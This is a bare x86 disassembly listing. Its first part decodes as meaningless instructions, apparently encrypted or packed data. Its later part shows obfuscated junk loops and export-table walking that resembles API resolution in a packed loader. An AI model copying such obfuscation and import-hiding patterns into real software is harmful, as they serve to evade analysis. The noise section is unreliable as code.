  40a67a:	bnd jmp 0x40a6f6
  40a67d:	pop    eax
  40a67e:	xor    cl,BYTE PTR [esi]
  40a680:	sti    
  40a681:	mov    ebp,0xceec269b
  40a686:	out    dx,al
  40a687:	jb     0x40a64a
  40a689:	sbb    eax,0x805049e5
  40a68e:	repz mov esp,0xfeddc32a
  40a694:	in     al,0x9c
  40a696:	or     esp,DWORD PTR [esi+esi*8+0x391c5e1f]
  40a69d:	mov    WORD PTR [edi-0x5f],gs
  40a6a0:	pop    esi
  40a6a1:	pop    eax
  40a6a2:	fdivr  DWORD PTR [ecx]
  40a6a4:	jmp    0x97d3:0x26045bb0
  40a6ab:	fnstcw WORD PTR [ecx]
  40a6ad:	fbld   TBYTE PTR [ebx+0x47]
  40a6b0:	mov    esp,ecx
  40a6b2:	loopne 0x40a6a6
  40a6b4:	or     dl,BYTE PTR [ebp-0x3e1dfcdf]
  40a6ba:	fadd   st,st(7)
  40a6bc:	mov    eax,ds:0x18a0edc1
  40a6c1:	sub    eax,esi
  40a6c3:	jmp    0x40a6ac
  40a6c5:	lds    edx,FWORD PTR [edi-0x2]
  40a6c8:	and    bl,BYTE PTR [ebx+edi*2+0x64c8b4c9]
  40a6cf:	adc    bh,ah
  40a6d1:	bound  ebx,QWORD PTR [edx-0x17]
  40a6d4:	jne    0x40a6cb
  40a6d6:	add    al,0x92
  40a6d9:	lods   al,BYTE PTR ds:[esi]
  40a6da:	sub    DWORD PTR [edi+0x77f627f0],0xffffffc8
  40a6e1:	jg     0x40a74e
  40a6e3:	pop    eax
  40a6e4:	mov    ah,0x69
  40a6e6:	xor    al,ah
  40a6e8:	sub    BYTE PTR [ebx+0x5],0xf
  40a6ec:	and    DWORD PTR [ebp-0x7b],eax
  40a6ef:	out    dx,al
  40a6f0:	xchg   esi,eax
  40a6f1:	cmp    eax,0xf3e67c22
  40a6f6:	(bad)  
  40a6f7:	(bad)  
  40a6f9:	mov    al,ds:0x92a4a384
  40a6fe:	dec    edi
  40a6ff:	pop    ecx
  40a700:	jmp    0x6d12e308
  40a705:	push   ebp
  40a706:	mov    ebx,0x329fd39e
  40a70b:	jne    0x40a776
  40a70d:	bound  ebx,QWORD PTR [eax+eax*4+0x6a]
  40a711:	call   0x4b44c9f9
  40a716:	inc    eax
  40a717:	jno    0x40a76b
  40a719:	pop    edx
  40a71a:	mov    ah,BYTE PTR [eax+0x7e]
  40a71d:	pop    ecx
  40a71e:	lock sbb eax,0x101f57db
  40a724:	in     eax,0xc8
  40a726:	fistp  QWORD PTR [eax+edi*8+0x3b]
  40a72a:	inc    esp
  40a72b:	add    dh,BYTE PTR [eax+edx*8]
  40a72e:	iret   
  40a72f:	xor    eax,0x602dbba2
  40a734:	imul   esp,DWORD PTR [ebp+0x3d],0xffffffdc
  40a738:	outs   dx,DWORD PTR ds:[esi]
  40a739:	cmp    eax,0x6b1d74e2
  40a73e:	test   al,0x7d
  40a740:	add    al,0x23
  40a742:	out    0x74,al
  40a744:	jl     0x40a764
  40a746:	xchg   esp,eax
  40a747:	test   al,0x65
  40a749:	js     0x40a6fb
  40a74b:	mov    ecx,0x3914af10
  40a750:	mov    bh,0x54
  40a752:	mov    al,BYTE PTR [esi+0x45]
  40a755:	pop    ebx
  40a756:	div    al
  40a758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a759:	adc    BYTE PTR [ecx+0x2ea6ca55],dh
  40a75f:	xchg   BYTE PTR [ebx-0x3c95b198],cl
  40a765:	pop    esp
  40a766:	mov    ebp,0x24ae8a3d
  40a76b:	xor    DWORD PTR ds:0x6911bd0a,0x768ad5ce
  40a775:	int    0x71
  40a777:	popa   
  40a778:	mov    ebp,0xd2efa89a
  40a77d:	fcom   QWORD PTR [ebx]
  40a77f:	push   ecx
  40a780:	fs mov dh,0x60
  40a783:	loope  0x40a7ac
  40a785:	test   eax,0x11f7bd41
  40a78a:	mul    DWORD PTR [edx+0x25581ba6]
  40a790:	in     eax,0xd2
  40a792:	daa    
  40a793:	loopne 0x40a7f7
  40a795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a796:	mov    ebx,0x8f4cfc38
  40a79b:	fiadd  WORD PTR [edi+0x67]
  40a79e:	test   BYTE PTR [edx+0x173cd2f2],0xb0
  40a7a5:	or     DWORD PTR [edx],edi
  40a7a7:	pop    es
  40a7a8:	pop    ebx
  40a7a9:	mul    DWORD PTR [esi+0x31]
  40a7ac:	cli    
  40a7ad:	test   eax,0x5bf53a85
  40a7b2:	nop
  40a7b3:	mov    ah,BYTE PTR [ebx+0x62]
  40a7b6:	xor    al,0xb0
  40a7b8:	mov    ebp,0x741366b6
  40a7bd:	inc    ebp
  40a7be:	fnsave [ebp-0x46]
  40a7c1:	mov    ds:0x47cbde63,al
  40a7c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7c7:	add    cl,BYTE PTR [esi+eiz*1+0x473b7491]
  40a7ce:	aam    0x15
  40a7d0:	ins    DWORD PTR es:[edi],dx
  40a7d1:	arpl   WORD PTR [edx+0x19],si
  40a7d4:	pop    ebp
  40a7d5:	repnz add esp,DWORD PTR [edi+0x79]
  40a7d9:	data16 int 0x71
  40a7dc:	lds    ecx,FWORD PTR [edi-0x6db990b5]
  40a7e2:	arpl   WORD PTR [edi],bx
  40a7e4:	or     cl,0xee
  40a7e7:	dec    edi
  40a7e8:	jno    0x40a820
  40a7ea:	xor    esp,ebx
  40a7ec:	xor    al,0x81
  40a7ee:	push   cs
  40a7ef:	cmc    
  40a7f0:	push   ss
  40a7f1:	cld    
  40a7f2:	fwait
  40a7f3:	nop
  40a7f4:	sub    BYTE PTR [ecx+0x3e643979],0xfa
  40a7fb:	mov    ebp,esi
  40a7fd:	test   eax,0x7cf3bdda
  40a802:	mov    eax,0xf414144c
  40a807:	out    0x9e,eax
  40a809:	cs pop esp
  40a80b:	jne    0x40a85b
  40a80d:	mov    edx,0x1a9bfd3c
  40a812:	sbb    al,0xbf
  40a814:	mov    al,ds:0x38dd40c
  40a819:	or     BYTE PTR [ecx+0x8],ah
  40a81c:	nop
  40a81d:	(bad)  
  40a81e:	jmp    0x40a83f
  40a820:	cld    
  40a821:	or     dl,cl
  40a823:	outs   dx,BYTE PTR ds:[esi]
  40a824:	pop    es
  40a825:	cmp    al,0xe8
  40a827:	cdq    
  40a828:	push   es
  40a829:	lods   eax,DWORD PTR ds:[esi]
  40a82a:	jmp    0xa487:0x6b229f51
  40a831:	cmp    ecx,ebp
  40a833:	add    eax,0xb95fbf76
  40a838:	mov    ah,0xba
  40a83a:	and    al,0xe4
  40a83c:	cmp    dh,ch
  40a83e:	fild   QWORD PTR [eax]
  40a840:	xchg   edx,eax
  40a841:	scas   al,BYTE PTR es:[edi]
  40a842:	jmp    0x1f0ea45e
  40a847:	ret    
  40a848:	xor    edx,DWORD PTR [edi+0x1a2227de]
  40a84e:	push   ds
  40a84f:	leave  
  40a850:	inc    edi
  40a851:	xchg   esi,eax
  40a852:	lods   eax,DWORD PTR ds:[esi]
  40a853:	outs   dx,DWORD PTR ds:[esi]
  40a854:	pop    esi
  40a855:	or     eax,0x1ad8ef0
  40a85a:	jns    0x40a8d4
  40a85c:	cld    
  40a85d:	fsubr  DWORD PTR [esi+eax*8]
  40a860:	mov    ds:0x1dd33b8f,eax
  40a865:	out    dx,eax
  40a866:	pop    esp
  40a867:	popf   
  40a868:	push   edx
  40a869:	stos   BYTE PTR es:[edi],al
  40a86a:	jb     0x40a8a8
  40a86c:	mov    esi,0x1713965f
  40a871:	(bad)  
  40a872:	lock fiadd WORD PTR [esp+ebx*4+0x0]
  40a877:	mov    esp,0xaabe61c5
  40a87c:	jo     0x40a869
  40a87e:	call   0x21c2:0x1619914c
  40a885:	xor    DWORD PTR [ecx+ebp*4+0x122d0283],ecx
  40a88c:	mov    DWORD PTR [ecx+0x5733d8ac],0xfbe06f17
  40a896:	jmp    0x2c87:0x41118a7d
  40a89d:	std    
  40a89e:	inc    esi
  40a89f:	add    bh,BYTE PTR [edi]
  40a8a1:	jb     0x40a8e9
  40a8a3:	call   0x28540afd
  40a8a8:	mov    al,0xb3
  40a8aa:	bound  edx,QWORD PTR [ecx-0x7dbee7e1]
  40a8b0:	sub    DWORD PTR [esp+eiz*2-0x7baaf38d],0xffffffc0
  40a8b8:	sbb    cl,BYTE PTR [eax-0x27681229]
  40a8be:	daa    
  40a8bf:	cwde   
  40a8c0:	psrlq  mm2,QWORD PTR [edi+0x4f]
  40a8c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8c5:	push   0x499e8b6b
  40a8ca:	dec    edx
  40a8cb:	jno    0x40a8df
  40a8cd:	mov    dl,0xd6
  40a8cf:	imul   ecx,DWORD PTR [esi-0x3c],0xffffffc0
  40a8d3:	ret    0x9db6
  40a8d6:	push   ss
  40a8d7:	jl     0x40a955
  40a8d9:	fdiv   st,st(7)
  40a8db:	les    eax,FWORD PTR [ecx+0x10]
  40a8de:	es mov esi,0xad806cd1
  40a8e4:	add    eax,0xc9e1edc6
  40a8e9:	push   edx
  40a8ea:	sbb    DWORD PTR [ebp-0x47],eax
  40a8ed:	pcmpgtw mm3,QWORD PTR [esi+0x72]
  40a8f1:	aaa    
  40a8f2:	mov    edx,0x88bffe1c
  40a8f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8f8:	cli    
  40a8f9:	adc    DWORD PTR [ebx],esi
  40a8fb:	push   ds
  40a8fc:	mov    al,ds:0x329b2664
  40a901:	test   bl,dl
  40a903:	sub    DWORD PTR [eax+0x1a],ebp
  40a906:	and    bh,BYTE PTR [esi-0x6d]
  40a909:	rol    BYTE PTR ss:[eax*8-0x6c943680],1
  40a911:	aam    0xb9
  40a913:	ror    ebx,0x5e
  40a916:	sub    ecx,eax
  40a918:	jmp    0xe2f3:0xd764c6f6
  40a91f:	leave  
  40a920:	xchg   ecx,eax
  40a921:	std    
  40a922:	adc    BYTE PTR [edi+0x3b7fafb0],0x2c
  40a929:	push   ss
  40a92a:	jle    0x40a8eb
  40a92c:	outs   dx,BYTE PTR ds:[esi]
  40a92d:	push   esp
  40a92e:	(bad)  
  40a92f:	sub    esp,DWORD PTR [ebx+0x7e7047c7]
  40a935:	push   ds
  40a936:	pop    eax
  40a937:	rcl    DWORD PTR [edi+edx*8-0x30],cl
  40a93b:	pop    ebx
  40a93c:	push   ebp
  40a93d:	stc    
  40a93e:	pop    ds
  40a93f:	xchg   ebp,eax
  40a940:	jbe    0x40a918
  40a942:	mov    ebp,0xfcf4b704
  40a947:	icebp  
  40a948:	or     dh,BYTE PTR [ecx]
  40a94a:	inc    ebp
  40a94b:	arpl   WORD PTR [eax],si
  40a94d:	xor    al,0xb7
  40a94f:	inc    ebp
  40a950:	mov    edi,0x53f9de59
  40a955:	ja     0x40a913
  40a957:	push   es
  40a958:	std    
  40a959:	push   0x79
  40a95b:	add    al,0x83
  40a95d:	sahf   
  40a95e:	xor    al,dl
  40a960:	lock adc al,0xee
  40a963:	mov    dl,0x27
  40a965:	lods   al,BYTE PTR ds:[esi]
  40a966:	fptan  
  40a968:	adc    ch,BYTE PTR [edx]
  40a96a:	xlat   BYTE PTR ds:[ebx]
  40a96b:	je     0x40a9c9
  40a96d:	cmp    eax,0xc2431b43
  40a972:	or     BYTE PTR [esi+ebx*8],0x35
  40a976:	shr    DWORD PTR [edx+0x63],0x87
  40a97a:	xchg   esp,eax
  40a97b:	(bad)  
  40a97c:	pop    ecx
  40a97d:	out    0x1e,eax
  40a97f:	es into 
  40a981:	jmp    0x40a907
  40a983:	lods   al,BYTE PTR ds:[esi]
  40a984:	jmp    0x63cb:0x3c2c8dce
  40a98b:	retf   0x1360
  40a98e:	xor    DWORD PTR [ebx+eax*4-0x213ce2eb],ebp
  40a995:	dec    esi
  40a996:	dec    DWORD PTR cs:[ebx-0x34]
  40a99a:	aas    
  40a99b:	int3   
  40a99c:	dec    ebp
  40a99d:	and    al,bl
  40a99f:	in     al,dx
  40a9a0:	cdq    
  40a9a1:	push   esi
  40a9a2:	call   0x474cf14b
  40a9a7:	(bad)  
  40a9a9:	jp     0x40a9db
  40a9ab:	das    
  40a9ac:	mov    al,ds:0x2f68d702
  40a9b1:	sbb    DWORD PTR [ebx],ebp
  40a9b3:	imul   esp,DWORD PTR [ebx],0x109c5a81
  40a9b9:	mov    ch,0xd3
  40a9bb:	cmc    
  40a9bc:	or     al,0x50
  40a9be:	test   BYTE PTR [edi+0x7b95e5d5],bl
  40a9c4:	rol    BYTE PTR [esi+0x45fe6136],0xe3
  40a9cb:	gs loop 0x40aa46
  40a9ce:	xor    al,al
  40a9d0:	lahf   
  40a9d1:	mov    esi,0x7798cbe3
  40a9d6:	mov    dh,0xa4
  40a9d8:	mov    eax,ss:0x832becbc
  40a9de:	jbe    0x40a98e
  40a9e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9e1:	fisttp QWORD PTR [edx]
  40a9e3:	jp     0x40aa10
  40a9e5:	mov    ecx,0x5ad04173
  40a9ea:	inc    ebp
  40a9eb:	push   ebp
  40a9ec:	and    al,dh
  40a9ee:	mov    ds:0xf8127f56,eax
  40a9f3:	add    dl,BYTE PTR [ecx*1-0x1d8820e]
  40a9fa:	cmp    edi,edx
  40a9fc:	test   BYTE PTR [ebx-0xb],ch
  40a9ff:	push   ss
  40aa00:	outs   dx,BYTE PTR ds:[esi]
  40aa01:	xchg   edi,eax
  40aa02:	rol    BYTE PTR [esi+0x145937a1],0x1a
  40aa09:	fwait
  40aa0a:	hlt    
  40aa0b:	push   edx
  40aa0c:	mov    eax,0xc6a3a876
  40aa11:	into   
  40aa12:	pop    ebx
  40aa13:	sbb    eax,0x355a5c95
  40aa18:	das    
  40aa19:	lea    ecx,ds:0x1b7ff672
  40aa1f:	in     eax,dx
  40aa20:	mov    ebp,DWORD PTR [edx+0x77a51f56]
  40aa26:	mov    eax,edi
  40aa28:	sub    DWORD PTR [esi],ecx
  40aa2a:	loope  0x40aa62
  40aa2c:	call   DWORD PTR ds:0x425014
  40aa32:	push   0x97898797
  40aa37:	or     DWORD PTR ds:0x42a008,0x42d008
  40aa41:	call   DWORD PTR ds:0x425004
  40aa47:	and    DWORD PTR ds:0x42c01c,0x0
  40aa51:	mov    ebx,DWORD PTR ds:0x42c01c
  40aa57:	inc    ebx
  40aa58:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa5e:	cmp    DWORD PTR ds:0x42c01c,0x5
  40aa65:	jne    0x40aa76
  40aa6b:	push   0x57f5
  40aa70:	call   DWORD PTR ds:0x42504c
  40aa76:	cmp    DWORD PTR ds:0x42c01c,0x4
  40aa7d:	jne    0x40aa92
  40aa83:	xor    ebx,ebx
  40aa85:	xor    ebx,DWORD PTR ds:0x42c01c
  40aa8b:	inc    ebx
  40aa8c:	mov    DWORD PTR ds:0x42c01c,ebx
  40aa92:	cmp    DWORD PTR ds:0x42c01c,0x10
  40aa99:	jb     0x40aa51
  40aa9f:	xor    eax,eax
  40aaa1:	xor    eax,DWORD PTR ds:0x42a014
  40aaa7:	xor    DWORD PTR ds:0x42d018,eax
  40aaad:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  40aab4:	or     ecx,DWORD PTR ds:0x42d008
  40aaba:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aac1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aac4:	or     DWORD PTR ds:0x42b014,edi
  40aaca:	mov    ebx,0x7510893
  40aacf:	xor    eax,eax
  40aad1:	or     eax,DWORD PTR ds:0x423de6
  40aad7:	mov    eax,DWORD PTR [eax]
  40aad9:	or     DWORD PTR ds:0x42d018,eax
  40aadf:	xor    ecx,ebx
  40aae1:	not    eax
  40aae3:	mov    eax,0x3272db
  40aae8:	or     DWORD PTR ds:0x42c010,0x42900c
  40aaf2:	add    ecx,eax
  40aaf4:	mov    DWORD PTR [ebp-0x1c],ecx
  40aaf7:	mov    DWORD PTR ds:0x42c014,0x14
  40ab01:	cmp    DWORD PTR ds:0x42c014,0x0
  40ab08:	je     0x40aba7
  40ab0e:	cmp    DWORD PTR ds:0x42c014,0x2
  40ab15:	jne    0x40ab29
  40ab1b:	push   DWORD PTR [ebp-0x28]
  40ab1e:	push   0x4244f4
  40ab23:	call   DWORD PTR ds:0x425010
  40ab29:	cmp    DWORD PTR ds:0x42c014,0x3
  40ab30:	jne    0x40ab43
  40ab36:	mov    ecx,DWORD PTR ds:0x42c014
  40ab3c:	dec    ecx
  40ab3d:	mov    DWORD PTR ds:0x42c014,ecx
  40ab43:	mov    ecx,DWORD PTR ds:0x42c014
  40ab49:	dec    ecx
  40ab4a:	mov    DWORD PTR ds:0x42c014,ecx
  40ab50:	jmp    0x40ab01
  40ab55:	mov    DWORD PTR ds:0x42a018,0x12
  40ab5f:	cmp    DWORD PTR ds:0x42a018,0x0
  40ab66:	je     0x40aba7
  40ab6c:	cmp    DWORD PTR ds:0x42a018,0x1a
  40ab73:	jne    0x40ab85
  40ab79:	push   DWORD PTR [ebp-0x1c]
  40ab7c:	push   DWORD PTR [ebp-0x18]
  40ab7f:	call   DWORD PTR ds:0x425018
  40ab85:	mov    ecx,DWORD PTR ds:0x42a018
  40ab8b:	dec    ecx
  40ab8c:	mov    DWORD PTR ds:0x42a018,ecx
  40ab92:	jmp    0x40ab5f
  40ab97:	xor    ecx,ecx
  40ab99:	xor    ecx,DWORD PTR ds:0x42455d
  40ab9f:	mov    ecx,DWORD PTR [ecx]
  40aba1:	sbb    DWORD PTR ds:0x42a00c,ecx
  40aba7:	mov    ecx,DWORD PTR [ebp+0x14]
  40abaa:	test   ecx,ecx
  40abac:	je     0x40ac29
  40abb2:	and    DWORD PTR ds:0x42c014,edi
  40abb8:	mov    ecx,DWORD PTR [ebp+0x14]
  40abbb:	mov    DWORD PTR ds:0x42c014,0x11
  40abc5:	cmp    DWORD PTR ds:0x42c014,0x0
  40abcc:	je     0x40ac1e
  40abd2:	cmp    DWORD PTR ds:0x42c014,0x5
  40abd9:	jne    0x40abf2
  40abdf:	push   0x429028
  40abe4:	push   DWORD PTR [ebp-0x20]
  40abe7:	push   0x424368
  40abec:	call   DWORD PTR ds:0x42501c
  40abf2:	cmp    DWORD PTR ds:0x42c014,0x6
  40abf9:	jne    0x40ac0c
  40abff:	mov    edi,DWORD PTR ds:0x42c014
  40ac05:	dec    edi
  40ac06:	mov    DWORD PTR ds:0x42c014,edi
  40ac0c:	mov    edi,DWORD PTR ds:0x42c014
  40ac12:	dec    edi
  40ac13:	mov    DWORD PTR ds:0x42c014,edi
  40ac19:	jmp    0x40abc5
  40ac1e:	mov    ecx,DWORD PTR [ecx]
  40ac20:	xor    DWORD PTR ds:0x42a018,ecx
  40ac26:	mov    DWORD PTR [ebp-0x1c],ecx
  40ac29:	adc    DWORD PTR ds:0x429024,edi
  40ac2f:	mov    ecx,0x7665
  40ac34:	imul   edx,eax
  40ac37:	mov    DWORD PTR ds:0x42d00c,0x1b
  40ac41:	cmp    DWORD PTR ds:0x42d00c,0x0
  40ac48:	je     0x40ac9b
  40ac4e:	cmp    DWORD PTR ds:0x42d00c,0x4
  40ac55:	jne    0x40ac69
  40ac5b:	push   0x429020
  40ac60:	push   DWORD PTR [ebp-0x1c]
  40ac63:	call   DWORD PTR ds:0x425020
  40ac69:	cmp    DWORD PTR ds:0x42d00c,0x5
  40ac70:	jne    0x40ac83
  40ac76:	mov    edi,DWORD PTR ds:0x42d00c
  40ac7c:	dec    edi
  40ac7d:	mov    DWORD PTR ds:0x42d00c,edi
  40ac83:	mov    edi,DWORD PTR ds:0x42d00c
  40ac89:	dec    edi
  40ac8a:	mov    DWORD PTR ds:0x42d00c,edi
  40ac90:	jmp    0x40ac41
  40ac95:	xor    DWORD PTR ds:0x42b010,edi
  40ac9b:	mov    esi,0x76532
  40aca0:	add    edx,ecx
  40aca2:	xchg   esi,ecx
  40aca4:	or     edi,esi
  40aca6:	mov    edi,0x54354
  40acab:	movzx  ecx,BYTE PTR ds:0x42901c
  40acb2:	sbb    DWORD PTR ds:0x429000,ecx
  40acb8:	sub    edx,edi
  40acba:	mov    ecx,DWORD PTR [ebp-0x4]
  40acbd:	sbb    DWORD PTR ds:0x429028,0x4a48
  40acc7:	xor    ecx,ebx
  40acc9:	and    esi,DWORD PTR ds:0x42900c
  40accf:	add    ecx,eax
  40acd1:	mov    DWORD PTR [ebp-0x8],ecx
  40acd4:	mov    DWORD PTR ds:0x42b014,0x169
  40acde:	mov    ecx,DWORD PTR [ebp-0x14]
  40ace1:	add    esi,DWORD PTR ds:0x42b000
  40ace7:	xor    ecx,ebx
  40ace9:	add    DWORD PTR ds:0x42d00c,0x42d004
  40acf3:	add    ecx,eax
  40acf5:	mov    DWORD PTR [ebp-0x24],ecx
  40acf8:	and    esi,esi
  40acfa:	mov    ecx,DWORD PTR [ebp-0x4]
  40acfd:	and    DWORD PTR ds:0x42b000,0x0
  40ad07:	jmp    0x40ad19
  40ad0c:	mov    esi,DWORD PTR ds:0x42b000
  40ad12:	inc    esi
  40ad13:	mov    DWORD PTR ds:0x42b000,esi
  40ad19:	cmp    DWORD PTR ds:0x42b000,0x10
  40ad20:	jae    0x40ad70
  40ad26:	cmp    DWORD PTR ds:0x42b000,0x4
  40ad2d:	jne    0x40ad3e
  40ad33:	push   0x8810
  40ad38:	call   DWORD PTR ds:0x425028
  40ad3e:	cmp    DWORD PTR ds:0x42b000,0x3
  40ad45:	jne    0x40ad58
  40ad4b:	mov    esi,DWORD PTR ds:0x42b000
  40ad51:	inc    esi
  40ad52:	mov    DWORD PTR ds:0x42b000,esi
  40ad58:	jmp    0x40ad0c
  40ad5d:	movzx  esi,WORD PTR ds:0x42d00c
  40ad64:	adc    esi,DWORD PTR ds:0x42b018
  40ad6a:	mov    DWORD PTR ds:0x42d00c,esi
  40ad70:	xor    ecx,ebx
  40ad72:	add    ecx,eax
  40ad74:	add    esi,0x75ba
  40ad7a:	mov    DWORD PTR [ebp-0x30],ecx
  40ad7d:	or     ecx,DWORD PTR ds:0x42c010
  40ad83:	mov    esi,DWORD PTR [ebp-0x4]
  40ad86:	inc    ecx
  40ad87:	xor    esi,ebx
  40ad89:	mov    ecx,DWORD PTR ds:0x424545
  40ad8f:	mov    ecx,DWORD PTR [ecx]
  40ad91:	adc    DWORD PTR ds:0x429020,ecx
  40ad97:	add    esi,eax
  40ad99:	mov    ecx,DWORD PTR [ebp-0x24]
  40ad9c:	sub    DWORD PTR ds:0x42c010,0x42c004
  40ada6:	sub    ecx,eax
  40ada8:	lea    edx,[esi-0x3272db]
  40adae:	xor    DWORD PTR ds:0x42a004,0x429028
  40adb8:	xor    ecx,ebx
  40adba:	xor    edx,ebx
  40adbc:	mov    DWORD PTR ds:0x42b00c,0x3cf6
  40adc6:	cmp    edx,ecx
  40adc8:	mov    DWORD PTR ds:0x42a008,0x130c
  40add2:	je     0x40afdf
  40add8:	sub    ecx,0x2467
  40adde:	mov    ecx,DWORD PTR [ebp-0x4]
  40ade1:	and    DWORD PTR ds:0x42c00c,0x42d01c
  40adeb:	xor    ecx,ebx
  40aded:	add    DWORD PTR ds:0x42b018,0x2ea9
  40adf7:	add    ecx,eax
  40adf9:	mov    DWORD PTR ds:0x42b000,0x737d
  40ae03:	cmp    esi,ecx
  40ae05:	mov    DWORD PTR ds:0x42b018,0x3d4e
  40ae0f:	jne    0x40afbc
  40ae15:	push   DWORD PTR [ebp+0x8]
  40ae18:	call   0x423b6c
  40ae1d:	mov    DWORD PTR [ebp-0x18],eax
  40ae20:	mov    eax,DWORD PTR [ebp-0x4]
  40ae23:	xor    edi,ecx
  40ae25:	mov    ecx,DWORD PTR [ebp-0x18]
  40ae28:	xor    eax,ebx
  40ae2a:	and    DWORD PTR ds:0x42901c,0x0
  40ae34:	jmp    0x40ae46
  40ae39:	mov    edi,DWORD PTR ds:0x42901c
  40ae3f:	inc    edi
  40ae40:	mov    DWORD PTR ds:0x42901c,edi
  40ae46:	cmp    DWORD PTR ds:0x42901c,0x1d
  40ae4d:	jae    0x40ae90
  40ae53:	cmp    DWORD PTR ds:0x42901c,0x2c
  40ae5a:	jne    0x40ae85
  40ae60:	push   0x61ef
  40ae65:	push   0x288b
  40ae6a:	push   0x42d018
  40ae6f:	push   DWORD PTR [ebp-0x28]
  40ae72:	push   0x2975
  40ae77:	push   DWORD PTR [ebp-0x24]
  40ae7a:	push   0x26ce
  40ae7f:	call   DWORD PTR ds:0x42502c
  40ae85:	jmp    0x40ae39
  40ae8a:	or     DWORD PTR ds:0x42c010,ebx
  40ae90:	mov    edi,0x3272db
  40ae95:	add    eax,edi
  40ae97:	mov    DWORD PTR ds:0x42901c,0x5f35
  40aea1:	cmp    ecx,eax
  40aea3:	mov    DWORD PTR ds:0x42c018,0x19df
  40aead:	je     0x40b04f
  40aeb3:	sub    DWORD PTR ds:0x42d018,0x5f9c
  40aebd:	push   DWORD PTR [ebp-0x18]
  40aec0:	and    DWORD PTR ds:0x42b018,0x42b000
  40aeca:	push   DWORD PTR [ebp+0x8]
  40aecd:	dec    DWORD PTR ds:0x42a00c
  40aed3:	call   0x423c4b
  40aed8:	or     DWORD PTR ds:0x42a014,0x42a00c
  40aee2:	mov    DWORD PTR [ebp-0x18],eax
  40aee5:	mov    eax,DWORD PTR [ebp-0x4]
  40aee8:	sbb    DWORD PTR ds:0x42a010,0x3b6d
  40aef2:	mov    ecx,DWORD PTR [ebp-0x18]
  40aef5:	xor    eax,ebx
  40aef7:	add    DWORD PTR ds:0x429004,0x42d004
  40af01:	add    eax,edi
  40af03:	mov    DWORD PTR ds:0x42a018,0x317f
  40af0d:	cmp    ecx,eax
  40af0f:	je     0x40b04f
  40af15:	mov    eax,DWORD PTR [ebp-0x18]
  40af18:	mov    eax,DWORD PTR [eax+0x18]
  40af1b:	mov    ecx,DWORD PTR ds:0x42d000
  40af21:	xor    DWORD PTR ds:0x42a014,ecx
  40af27:	mov    DWORD PTR [ebp-0x24],eax
  40af2a:	mov    eax,DWORD PTR [ebp-0x18]
  40af2d:	and    DWORD PTR ds:0x42b018,0x0
  40af37:	jmp    0x40af49
  40af3c:	mov    ecx,DWORD PTR ds:0x42b018
  40af42:	inc    ecx
  40af43:	mov    DWORD PTR ds:0x42b018,ecx
  40af49:	cmp    DWORD PTR ds:0x42b018,0x16
  40af50:	jae    0x40af77
  40af56:	cmp    DWORD PTR ds:0x42b018,0x20
  40af5d:	jne    0x40af6c
  40af63:	push   DWORD PTR [ebp-0x28]
  40af66:	call   DWORD PTR ds:0x425030
  40af6c:	jmp    0x40af3c
  40af71:	xor    ecx,DWORD PTR ds:0x42b01c
  40af77:	mov    ecx,DWORD PTR [ebp+0x8]
  40af7a:	add    ecx,DWORD PTR [eax+0x20]
  40af7d:	sub    eax,DWORD PTR ds:0x429024
  40af83:	mov    DWORD PTR [ebp-0x2c],ecx
  40af86:	mov    eax,DWORD PTR [ebp-0x18]
  40af89:	inc    ecx
  40af8a:	mov    ecx,DWORD PTR [ebp+0x8]
  40af8d:	add    ecx,DWORD PTR [eax+0x24]
  40af90:	mov    DWORD PTR [ebp-0x34],ecx
  40af93:	xor    DWORD PTR ds:0x42a004,edi
  40af99:	mov    eax,DWORD PTR [ebp-0x18]
  40af9c:	or     DWORD PTR ds:0x42a000,ebx
  40afa2:	mov    ecx,DWORD PTR [ebp+0x8]
  40afa5:	or     DWORD PTR ds:0x42a008,0x109d
  40afaf:	add    ecx,DWORD PTR [eax+0x1c]
  40afb2:	mov    eax,edi
  40afb4:	mov    DWORD PTR [ebp-0x18],ecx
  40afb7:	jmp    0x40b017
  40afbc:	mov    ecx,DWORD PTR [ebp-0x2c]
  40afbf:	mov    edx,DWORD PTR [ebp+0x8]
  40afc2:	add    edx,DWORD PTR [ecx+esi*4]
  40afc5:	mov    DWORD PTR [ebp-0x28],edx
  40afc8:	mov    ecx,DWORD PTR [ebp-0x4]
  40afcb:	mov    edx,DWORD PTR [ebp-0x28]
  40afce:	xor    ecx,ebx
  40afd0:	add    ecx,eax
  40afd2:	cmp    edx,ecx
  40afd4:	je     0x40b017
  40afda:	jmp    0x40b003
  40afdf:	mov    ecx,DWORD PTR [ebp-0x4]
  40afe2:	mov    edx,DWORD PTR [ebp-0x8]
  40afe5:	xor    ecx,ebx
  40afe7:	add    ecx,eax
  40afe9:	cmp    edx,ecx
  40afeb:	je     0x40b05b
  40aff1:	mov    ecx,DWORD PTR [ebp-0x4]
  40aff4:	mov    edx,DWORD PTR [ebp-0x30]
  40aff7:	xor    ecx,ebx
  40aff9:	add    ecx,eax
  40affb:	cmp    edx,ecx
  40affd:	je     0x40b06a
  40b003:	lea    eax,[ebp-0x8]
  40b006:	push   eax
  40b007:	push   DWORD PTR [ebp-0x28]
  40b00a:	push   DWORD PTR [ebp+0xc]
  40b00d:	call   0x401058
  40b012:	mov    eax,0x3272db
  40b017:	mov    ecx,DWORD PTR [ebp-0x4]
  40b01a:	mov    edx,DWORD PTR [ebp-0x8]
  40b01d:	xor    ecx,ebx
  40b01f:	add    ecx,eax
  40b021:	cmp    edx,ecx
  40b023:	je     0x40b03e
  40b029:	mov    ecx,DWORD PTR [ebp-0x34]
  40b02c:	movzx  ecx,WORD PTR [ecx+esi*2]
  40b030:	mov    edx,DWORD PTR [ebp-0x18]
  40b033:	mov    ecx,DWORD PTR [edx+ecx*4]
  40b036:	mov    DWORD PTR [ebp-0x38],ecx
  40b039:	jmp    0x40afdf
  40b03e:	mov    ecx,DWORD PTR [ebp-0x14]
  40b041:	xor    ecx,ebx
  40b043:	lea    esi,[esi+ecx*1+0x3272db]
  40b04a:	jmp    0x40ad99
  40b04f:	mov    eax,DWORD PTR [ebp-0x4]
